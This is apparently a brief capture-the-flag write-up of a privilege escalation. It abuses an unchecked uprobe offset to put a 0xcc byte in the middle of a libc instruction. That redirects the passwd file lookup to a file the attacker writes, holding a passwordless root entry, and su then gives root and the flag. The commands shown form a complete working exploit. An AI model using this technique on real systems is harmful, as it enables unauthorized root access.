Uprobes insert the byte 0xcc to the offset. 
The go program doesnt check if it the given offset is in instruction offsets, thus it is possible to insert 0xcc into the middle of instructions.

The easiest way to exploit this is to modify the lea instruction used to open the /etc/passwd file in libc.

Change the lea to load a pointer to a string that doesnt start with / then write our own passwd file.

Use su to switch user to root.

uprobe-runner /lib/libc.so.6 0x141f35 &
echo root::0:0:root:/root:/bin/sh > services
su
cat /flag
